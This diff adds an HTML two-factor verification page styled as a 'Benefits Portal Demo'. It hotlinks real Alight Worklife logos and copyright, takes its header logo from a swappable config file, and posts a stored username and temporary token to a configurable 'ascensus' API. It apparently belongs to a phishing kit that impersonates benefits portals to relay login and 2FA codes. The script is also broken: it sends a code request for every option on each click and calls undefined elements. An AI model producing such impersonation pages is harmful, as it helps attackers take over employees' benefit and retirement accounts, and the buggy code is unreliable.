@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+  />
+  <title>Benefits Portal Demo</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+html,
+body {
+  margin: 0;
+  padding: 0;
+  font-family: Arial, Helvetica, sans-serif;
+  color: #292929;
+  background: #fff;
+}
+
+body {
+  min-width: 320px;
+  font-size: 13px;
+}
+
+/* ================= HEADER ================= */
+
+.header {
+  position: sticky;
+  top: 0;
+  background: #fff;
+  height: 100px;
+  z-index: 999999;
+  border-bottom: 1px solid #aaa;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 28px;
+}
+
+.brand {
+  width: 92px;
+  height: 63px;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 23px;
+  font-weight: 400;
+  letter-spacing: -1px;
+}
+
+.assistant {
+  background: #126cb1da;
+  color: white;
+  border-radius: 25px;
+  padding: 10px 17px;
+  font-size: 13px;
+  font-weight: bold;
+  box-shadow: 0 2px 8px rgba(21, 40, 181, 0.55);
+  display: flex;
+  align-items: center;
+  gap: 7px;
+}
+
+.assistant-icon {
+  width: 21px;
+  height: 21px;
+  border: 1.5px solid white;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 10px;
+}
+
+/* ================= MAIN ================= */
+
+.main {
+  max-width: 1160px;
+  margin: 55px auto 0;
+  padding: 0 28px;
+  display: grid;
+  grid-template-columns: 335px 1fr;
+  gap: 28px;
+  align-items: start;
+}
+
+.left {
+  width: 100%;
+}
+
+.title {
+  font-size: 29px;
+  line-height: 1.4;
+  margin: 4px 0 25px;
+  font-weight: 700;
+}
+
+.card {
+  border: 1px solid #d4d4d4;
+  border-radius: 9px;
+  padding: 25px 25px 23px;
+  box-shadow: 0 1px 3px rgba(0,0,0,.03);
+}
+
+.card h2 {
+  margin: 0 0 16px;
+  font-size: 17px;
+  line-height: 1.3;
+}
+
+.required-info {
+  font-size: 12px;
+  line-height: 1.45;
+  margin: 0 0 17px;
+}
+
+.field-label {
+  display: block;
+  font-size: 12px;
+  margin-bottom: 7px;
+}
+
+.field-label span {
+  color: #777;
+  font-style: italic;
+}
+
+.required {
+  color: #a52b2b;
+}
+
+.input {
+  width: 100%;
+  height: 58px;
+  border: 1px solid #555;
+  outline: none;
+  padding: 8px;
+  font-size: 14px;
+  margin-bottom: 17px;
+}
+
+.input:focus {
+  border-color: #126bb1;
+  box-shadow: 0 0 0 1px #126bb1;
+}
+
+.remember {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 14px;
+  margin-bottom: 8px;
+}
+
+.remember input {
+  appearance: none;
+  width: 21px;
+  height: 21px;
+  border: 1px solid #888;
+  border-radius: 2px;
+  margin: 0;
+  background: #fff;
+  flex-shrink: 0;
+}
+
+.remember input:checked {
+  background: #126bb1;
+  box-shadow: inset 0 0 0 4px white;
+}
+
+.link {
+  color: #3977b5;
+  text-decoration: underline;
+  font-size: 12px;
+  cursor: pointer;
+}
+
+.next {
+  border: 0;
+  margin-top: 23px;
+  padding: 10px 19px;
+  border-radius: 22px;
+  background: #a4a4a4;
+  color: white;
+  font-size: 13px;
+  cursor: pointer;
+}
+
+.next:hover {
+  background: #858585;
+}
+
+/* ================= MESSAGE BOX ================= */
+
+.message-container {
+  display: none;
+  padding: 12px 15px;
+  border-radius: 5px;
+  margin-bottom: 15px;
+  font-size: 13px;
+  align-items: center;
+  gap: 8px;
+}
+
+.message-container.show {
+  display: flex;
+}
+
+.message-container.error {
+  background-color: #ffebee;
+  color: #c62828;
+  border: 1px solid #e57373;
+}
+
+.message-container.success {
+  background-color: #e8f5e9;
+  color: #2e7d32;
+  border: 1px solid #81c784;
+}
+
+.message-icon {
+  font-weight: bold;
+  font-size: 16px;
+}
+
+/* ================= IMAGE ================= */
+
+.image-area {
+  width: 100%;
+  height: 425px;
+  overflow: hidden;
+  object-fit: contain;
+  position: relative;
+}
+.image-area img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+
+.road {
+  position: absolute;
+  width: 75%;
+  height: 120%;
+  background: #555b59;
+  right: -12%;
+  bottom: -47%;
+  transform: rotate(-19deg);
+  border-left: 4px solid #eee;
+}
+
+.road::after {
+  content: "";
+  position: absolute;
+  left: 48%;
+  top: 0;
+  height: 100%;
+  border-left: 2px dashed #eee;
+}
+
+/* ================= FOOTER ================= */
+
+.footer {
+  margin-top: 25px;
+  background: #fafafa;
+  padding: 23px 28px 21px;
+}
+
+.footer-inner {
+  max-width: 960px;
+  margin: auto;
+}
+
+.footer-top {
+  display: flex;
+  justify-content: space-between;
+  gap: 25px;
+  padding-bottom: 23px;
+}
+
+.footer-links {
+  display: flex;
+  flex-direction: column;
+  gap: 17px;
+}
+
+.footer-links a {
+  color: #3977b5;
+  text-decoration: underline;
+  font-size: 13px;
+}
+
+.demo-brand {
+  font-size: 22px;
+  font-weight: bold;
+  width: 200px;
+  color: #222;
+  margin-bottom: 14px;
+}
+.demo-brand img {
+  width: 100%;
+  height: auto;
+  max-width: 200px;
+}
+
+.demo-brand span {
+  color: #79b99b;
+}
+
+.stores {
+  display: flex;
+  gap: 8px;
+}
+
+.store {
+  width: 100px;
+  height: 34px;
+  border-radius: 4px;
+  background: #050505;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 9px;
+  text-align: center;
+}
+.store img {
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+}
+.footer-bottom {
+  border-top: 1px solid #aaa;
+  padding-top: 22px;
+  display: flex;
+  justify-content: space-between;
+  gap: 22px;
+}
+
+.legal-links {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 20px;
+}
+
+.legal-links a {
+  color: #3977b5;
+  text-decoration: underline;
+  font-size: 12px;
+}
+
+.copyright {
+  font-size: 12px;
+  color: #666;
+  line-height: 1.5;
+  max-width: 250px;
+}
+
+/* ================= TABLET ================= */
+
+@media (max-width: 900px) {
+
+  .header {
+    height: 65px;
+    padding: 0 20px;
+  }
+
+  .brand {
+    width: 65px;
+    height: 39px;
+    font-size: 21px;
+  }
+
+  .assistant {
+    padding: 9px 14px;
+    font-size: 12px;
+  }
+
+  .main {
+    margin-top: 40px;
+    grid-template-columns: 300px 1fr;
+    gap: 20px;
+    padding: 0 20px;
+  }
+
+  .title {
+    font-size: 20px;
+  }
+
+  .card {
+    padding: 21px;
+  }
+
+  .image-area {
+    height: 370px;
+  }
+}
+
+/* ================= MOBILE ================= */
+
+@media (max-width: 700px) {
+
+  .header {
+    height: 62px;
+    padding: 0 15px;
+  }
+
+  .brand {
+    width: 60px;
+    height: 36px;
+    font-size: 19px;
+  }
+
+  .assistant {
+    padding: 8px 11px;
+    font-size: 11px;
+  }
+
+  .assistant-icon {
+    width: 19px;
+    height: 19px;
+    font-size: 9px;
+  }
+
+  .main {
+    display: block;
+    margin-top: 27px;
+    padding: 0 15px;
+  }
+
+  .title {
+    font-size: 19px;
+    margin-bottom: 19px;
+  }
+
+  .card {
+    padding: 19px;
+  }
+
+  .card h2 {
+    font-size: 16px;
+  }
+
+  .required-info,
+  .field-label,
+  .link {
+    font-size: 12px;
+  }
+
+  .input {
+    height: 51px;
+    font-size: 13px;
+  }
+
+  .remember {
+    font-size: 13px;
+  }
+
+  .remember input {
+    width: 19px;
+    height: 19px;
+  }
+
+  .next {
+    margin-top: 19px;
+    padding: 9px 17px;
+    font-size: 12px;
+  }
+
+  .image-area {
+    margin-top: 22px;
+    height: 230px;
+  }
+
+  .footer {
+    margin-top: 28px;
+    padding: 21px 15px;
+  }
+
+  .footer-top {
+    display: block;
+  }
+
+  .footer-links {
+    gap: 14px;
+  }
+
+  .footer-links a {
+    font-size: 12px;
+  }
+
+  .footer-right {
+    margin-top: 25px;
+  }
+
+  .footer-bottom {
+    display: block;
+  }
+
+  .legal-links {
+    gap: 10px 16px;
+    margin-bottom: 17px;
+  }
+
+  .legal-links a {
+    font-size: 11px;
+  }
+
+  .copyright {
+    font-size: 11px;
+  }
+}
+
+/* ================= SMALL PHONES ================= */
+
+@media (max-width: 400px) {
+
+  .assistant {
+    padding: 7px 9px;
+  }
+
+  .assistant-icon {
+    display: none;
+  }
+
+  .title {
+    font-size: 18px;
+  }
+
+  .card {
+    padding: 17px;
+  }
+
+  .image-area {
+    height: 200px;
+  }
+
+  .demo-brand {
+    font-size: 20px;
+  }
+}
+
+
+
+    main {
+      min-height: 386px;
+      display: flex;
+      justify-content: center;
+      padding-top: 0;
+    }
+
+    .verification {
+      width: 370px;
+     transform: translateY(20px);
+      margin: 9px;
+
+    }
+
+    h1 {
+      margin: 0 0 26px;
+      text-align: center;
+      font-size: 23px;
+      font-weight: 600;
+      color: #222;
+    }
+
+    .subtitle {
+      margin: 0 0 29px;
+      font-size: 18px;
+      color: #333;
+    }
+
+    .options {
+      border: 1px solid #d5d5d5;
+      border-radius: 11px;
+      padding: 27px 27px 24px;
+      box-shadow: 0 1px 3px rgba(0,0,0,.05);
+    }
+
+    .option {
+      min-height: 67px;
+      display: grid;
+      grid-template-columns: 31px 1fr 16px;
+      align-items: center;
+      column-gap: 8px;
+      cursor: pointer;
+      border-radius: 7px;
+      padding: 3px 5px;
+      transition: background-color .15s ease, box-shadow .15s ease;
+    }
+
+    .option:hover {
+      background: #f5f8fc;
+    }
+
+    .option.selected {
+      background: #eef5fc;
+      box-shadow: inset 0 0 0 1px #3976b7;
+    }
+
+    .option:focus-visible {
+      outline: 2px solid #3976b7;
+      outline-offset: 2px;
+    }
+</style>
+</head>
+<script src="../config.js"></script>
+
+
+<body>
+
+  <!-- HEADER -->
+  <header class="header">
+
+    <div class="brand">
+      <img  id="globalLogo" >
+    </div>
+
+    <div class="assistant">
+ <i class="fa-solid fa-comment-dots"></i>
+      Virtual Assistant
+    </div>
+
+  </header>
+
+
+  <!-- MAIN CONTENT -->
+  <main>
+    <section class="verification" aria-label="Verification options">
+      <h1>Verify Your Identity to continue</h1>
+      <p class="subtitle">Select a verification option.</p>
+
+    
+      <div class="options" role="radiogroup" aria-label="Verification options">
+        <div class="option" role="radio" aria-checked="false" tabindex="0" data-method="SMS">
+             <div class="icon"><i class="fa-solid fa-mobile-screen-button" aria-hidden="true"></i></div>
+          <div class="option-text">One-time code via phone</div>
+          <div class="arrow">›</div>
+        </div>
+
+        <div class="option" role="radio" aria-checked="false" tabindex="0" data-method="security questions">
+            <div class="icon"><i class="fa-regular fa-comments" aria-hidden="true"></i></div>
+          <div class="option-text">Answer security questions</div>
+          <div class="arrow">›</div>
+        </div>
+    </div>
+      </div>
+    </section>
+  </main>
+
+
+  <!-- FOOTER -->
+  <footer class="footer">
+
+    <div class="footer-inner">
+
+      <div class="footer-top">
+
+        <div class="footer-links">
+
+          <a href="#">Contact Us</a>
+          <a href="#">Feedback</a>
+          <a href="#">Protect Yourself From Website Fraud</a>
+
+        </div>
+
+        <div class="footer-right">
+
+          <div class="demo-brand">
+          <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight_worklife_logo_black.svg" alt="">
+          </div>
+
+          <div class="stores">
+            <div class="store">
+              <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-app-store.png" alt="">
+            </div>
+
+            <div class="store">
+             <img src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-google-play.png"/>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+
+
+      <div class="footer-bottom">
+
+        <div class="legal-links">
+
+          <a href="#">Privacy Policy</a>
+          <a href="#">Terms of Use</a>
+          <a href="#">Cookie Notice</a>
+          <a href="#">Cookie Settings</a>
+
+        </div>
+
+        <div class="copyright">
+          ©2026 Alight Solutions. All rights reserved.
+        </div>
+
+      </div>
+
+    </div>
+
+  </footer>
+
+
+<script>
+  function initPage() {
+  const logo = document.getElementById('globalLogo');
+  
+  const cfg = window.APP_CONFIG;
+
+  logo.src=cfg.logo
+  logo.alt=cfg.logoAlt
+
+
+ 
+}
+
+window.addEventListener('load', initPage);
+ const options = document.querySelectorAll(".option");
+ const username = localStorage.getItem('ascensus_username');
+ // FIXED VERSION - Proper API call with correct function structure
+
+function sendVerificationCode(username, method, tempToken) {
+  const sendCode = document.getElementById('sendCode'); // Make sure this element exists
+  
+  fetch(window.ascensus_API_BASE + '/api/two-factor/sendcode', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${tempToken}`
+    },
+    body: JSON.stringify({
+      username: username,
+      method: method 
+    })
+  })
+  .then(async response => {
+    const data = await response.json().catch(() => ({}));
+    return {
+      ok: response.ok,
+      data: data
+    };
+  })
+  .then(result => {
+    if (!result.ok) {
+      showMessage(
+        result.data.message ||
+        'Failed to send verification code.',
+        'error'
+      );
+      sendCode.disabled = false;
+      sendCode.textContent = 'Send Code';
+      return;
+    }
+
+    // Code successfully sent
+    window.location.href = 'verify-code.html';
+  })
+  .catch(error => {
+    console.error('2FA error:', error);
+    showMessage(
+      'Unable to reach the server. Please try again.',
+      'error'
+    );
+    sendCode.disabled = false;
+    sendCode.textContent = 'Send Code';
+  });
+}
+
+// Select verification method option
+function selectOption(option) {
+  
+  
+  options.forEach(item => {
+    const selected = item === option;
+    item.classList.toggle("selected", selected);
+    const method = option.getAttribute("data-method");
+    item.setAttribute("aria-checked", selected ? "true" : "false");
+
+    if (selected) {
+      localStorage.setItem('verification_method', method);
+    }
+    sendVerificationCode(username, method, localStorage.getItem('temp_token')); 
+  });
+}
+
+    options.forEach(option => {
+      option.addEventListener("click", () => selectOption(option));
+
+      option.addEventListener("keydown", event => {
+        if (event.key === "Enter" || event.key === " ") {
+          event.preventDefault();
+          selectOption(option);
+        }
+
+        if (event.key === "ArrowDown" || event.key === "ArrowRight") {
+          event.preventDefault();
+          const next = option.nextElementSibling || options[0];
+          next.focus();
+          selectOption(next);
+        }
+
+        if (event.key === "ArrowUp" || event.key === "ArrowLeft") {
+          event.preventDefault();
+          const previous = option.previousElementSibling ||
+            options[options.length - 1];
+          previous.focus();
+          selectOption(previous);
+        }
+      });
+    });
+</script>
+
+</body>
+</html>
